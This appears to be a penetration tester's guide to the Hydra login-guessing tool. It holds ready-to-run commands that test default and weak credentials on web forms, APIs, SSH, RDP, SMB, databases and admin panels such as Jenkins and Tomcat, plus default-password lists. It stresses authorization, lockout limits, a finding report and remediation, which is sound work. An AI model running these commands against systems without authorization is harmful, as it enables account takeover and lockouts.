# Hydra — Enterprise Penetration Testing Usage Guide

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Tool Mastery — Authentication Testing
>
> **Context:** Hydra is the tool I use for credential validation and default password testing in enterprise engagements — not indiscriminate brute force. The professional use case is targeted: test default credentials on discovered admin panels, validate discovered credential pairs across services, and demonstrate that weak password policies are exploitable. Enterprise engagements have strict rate limiting requirements and account lockout risks — this document reflects the disciplined approach that professional testing demands.

---

## ⚠️ Professional Usage Principles

```
Before running Hydra in ANY enterprise engagement:

  1. Check scope: Is credential testing explicitly authorised?
  2. Check for lockout: What is the account lockout policy?
     (Ask the client or test with 3 attempts manually first)
  3. Check rate limiting: Does the application lock IPs?
  4. Use -t 1 (single thread) on production systems with lockout risk
  5. Always use -V (verbose) so you can stop immediately on success
  6. Never run large wordlists against production accounts without
     explicit written authorisation and lockout exception

Professional use cases:
  ✓ Default credential testing (admin:admin, root:root, etc.)
  ✓ Validating specific credentials found elsewhere in the engagement
  ✓ Testing weak password policy (small targeted wordlist)
  ✓ Demonstrating absence of rate limiting on auth endpoints

NOT appropriate for enterprise testing without explicit authorisation:
  ✗ Full rockyou.txt against user accounts
  ✗ Credential stuffing against all users
  ✗ Any brute force that risks triggering account lockouts
```

---

## 🔧 Targeted Default Credential Testing

### Web Application Admin Panels

```bash
# Test default credentials on discovered admin panel
# Use a small, targeted default credentials list — not rockyou.txt

# Create targeted default creds list for enterprise context:
cat > default_creds.txt << 'EOF'
admin:admin
admin:password
admin:1234
admin:admin123
admin:Password1
admin:changeme
administrator:administrator
root:root
test:test
guest:guest
EOF

# Test HTTP form-based login
hydra -L default_users.txt -P default_creds.txt \
  target.company.com \
  http-post-form \
  "/admin/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -V -t 1 -w 3

# Flag explanation:
# -L: username list file
# -P: password list file
# -V: verbose (show every attempt)
# -t 1: 1 thread (slow, avoids lockout)
# -w 3: wait 3 seconds between attempts
# http-post-form: "[path]:[body]:[failure string]"

# For JSON-based login (modern APIs):
hydra -l admin -P default_pass.txt \
  target.company.com \
  http-post-form \
  '/api/auth/login:{"username":"\^USER\^","password":"\^PASS\^"}:{"error":' \
  -H "Content-Type: application/json" \
  -V -t 1

# Test HTTPS admin panel:
hydra -l admin -P default_pass.txt \
  -s 443 -S \
  target.company.com \
  http-post-form \
  "/admin/login:username=^USER^&password=^PASS^:Login failed" \
  -V -t 1
```

### Common Enterprise Services

```bash
# SSH default/weak credentials (internal network)
hydra -l root -P default_pass.txt \
  ssh://10.0.14.55 \
  -V -t 2

# Also test common enterprise SSH usernames:
hydra -L ssh_users.txt -P default_pass.txt \
  ssh://10.0.14.55 \
  -t 2 -V

# ssh_users.txt:
# root, admin, administrator, ubuntu, ec2-user, ansible, deploy

# FTP default credentials
hydra -l anonymous -p anonymous \
  ftp://target.company.com \
  -V
# Then test:
hydra -L default_users.txt -P default_pass.txt \
  ftp://target.company.com \
  -t 2 -V

# RDP (Windows Remote Desktop) — internal assessments only
hydra -l administrator -P default_pass.txt \
  rdp://10.0.14.55 \
  -V -t 1

# SMB (Windows file sharing)
hydra -l administrator -P default_pass.txt \
  smb://10.0.14.55 \
  -V -t 1

# MySQL default credentials
hydra -l root -P default_pass.txt \
  mysql://10.0.14.100 \
  -V -t 1

# PostgreSQL
hydra -l postgres -P default_pass.txt \
  postgres://10.0.14.100 \
  -V -t 1
```

### Platform-Specific Default Credentials

```bash
# Jenkins CI/CD
hydra -l admin -P jenkins_defaults.txt \
  target.company.com \
  http-post-form \
  "/j_spring_security_check:j_username=^USER^&j_password=^PASS^:loginError" \
  -s 8080 -V -t 1

# jenkins_defaults.txt: admin, password, jenkins, 1234

# Apache Tomcat Manager
hydra -L tomcat_users.txt -P tomcat_pass.txt \
  target.company.com \
  http-get \
  "/manager/html" \
  -s 8080 -V -t 1
# tomcat_users.txt: tomcat, admin, manager, role1
# tomcat_pass.txt: tomcat, s3cret, admin, password, 1234

# phpMyAdmin
hydra -l root -P mysql_defaults.txt \
  target.company.com \
  http-post-form \
  "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied" \
  -V -t 1

# Grafana
hydra -l admin -P grafana_defaults.txt \
  target.company.com \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid" \
  -s 3000 -V -t 1
# grafana_defaults.txt: admin, password, grafana
```

---

## 🔑 Rate Limiting Absence — Demonstrating the Finding

```bash
# Enterprise finding: "No rate limiting on authentication endpoint"
# Demonstrate with Hydra showing it can attempt N passwords with no lockout

# Safe demonstration approach:
# Use the same wrong password repeated (not a real password list)
# Just shows the lockout policy is absent — not actually cracking anything

cat > demo_passwords.txt << 'EOF'
WrongPass_001
WrongPass_002
WrongPass_003
WrongPass_004
WrongPass_005
WrongPass_006
WrongPass_007
WrongPass_008
WrongPass_009
WrongPass_010
EOF

hydra -l testuser@company.com \
  -P demo_passwords.txt \
  target.company.com \
  http-post-form \
  "/api/auth/login:email=^USER^&password=^PASS^:Invalid" \
  -V -t 5

# If all 10 attempts succeed without 429 or account lock:
# → "No rate limiting detected — 10 consecutive failed attempts
#    returned 200 OK without throttling or lockout"
# → Report as: Missing Brute Force Protection on Authentication Endpoint
# → Severity: Medium (without actual cracking, High with credential stuffing)
```

---

## 🛡️ Understanding the Failure String

```bash
# The failure string is the most critical part of the Hydra command
# It tells Hydra what a FAILED login looks like
# Any response NOT containing this string = Hydra treats it as success

# How to find the correct failure string:
# 1. Open Burp Suite
# 2. Send a wrong login manually
# 3. Look at the response body
# 4. Find a UNIQUE string that only appears on failure
#    Example: "Invalid username or password"  ← use this
#    NOT: "login" or "password" (too generic)
#    NOT: the entire error div (too long)

# Test your failure string first with a definitely-wrong credential:
hydra -l definitely_wrong_user -p definitely_wrong_pass \
  target.company.com \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:YOUR_FAILURE_STRING" \
  -V

# Expected: Hydra shows "FAILED" for every attempt
# If Hydra shows success with wrong creds = failure string is wrong
# This prevents false positives in your results
```

---

## 📋 Enterprise Report Template

```
Finding Title: Missing Brute Force Protection — Authentication Endpoint Accepts Unlimited Attempts

Severity: Medium | CVSS: 5.9

Affected Endpoint: POST /api/auth/login

Evidence:
  Tool: Hydra
  Command: hydra -l admin@company.com -P 100_wrong_passwords.txt
           target.company.com http-post-form
           "/api/auth/login:email=^USER^&password=^PASS^:Invalid credentials"
           -t 10 -V

  Result: 100 consecutive authentication attempts completed in 12 seconds.
  No rate limiting (HTTP 429) received.
  No account lockout triggered.
  Same response time throughout — no throttling detected.

Impact:
  An attacker can attempt credential stuffing or password spraying
  without restriction. Combined with common password lists or leaked
  credentials from breach databases (HIBP), this enables automated
  account takeover at scale.

Remediation:
  Implement rate limiting: max 5 attempts per account per 15-minute window
  Implement IP-based rate limiting: max 20 attempts per IP per minute
  After 5 failures: require CAPTCHA before continuing
  After 10 failures: temporary account lockout (15 minutes)
  Monitor and alert on unusual authentication patterns
```

---

## 🧭 Key Takeaways

**1. Always check for account lockout before running Hydra.**
Send 3 failed login attempts manually and see what happens. If the account locks, running Hydra will lock every account you target. In enterprise environments with real user accounts, this causes immediate service disruption. Confirm lockout policy with the client before ANY credential testing.

**2. Use `-t 1` with `-w` delay on production systems.**
Single thread, 2-3 second wait between attempts. Slow enough to not trigger IDS, not fast enough to cause server load issues. Speed matters less than not disrupting the client's live environment.

**3. The failure string must be unique and specific.**
A bad failure string produces false positives — Hydra says "found!" when it did not. Test your failure string with a definitely-wrong credential first. If Hydra reports success with wrong creds, fix your failure string before proceeding.

**4. Targeted default credential lists are more professional than rockyou.txt.**
In an enterprise engagement, running 14 million passwords from rockyou.txt is inappropriate. A targeted list of 20-50 known defaults for the specific platform (Tomcat, Jenkins, Grafana) is professional, sufficient, and demonstrates the finding without excessive risk.

---

## 🔗 References
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials)
- [OWASP Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
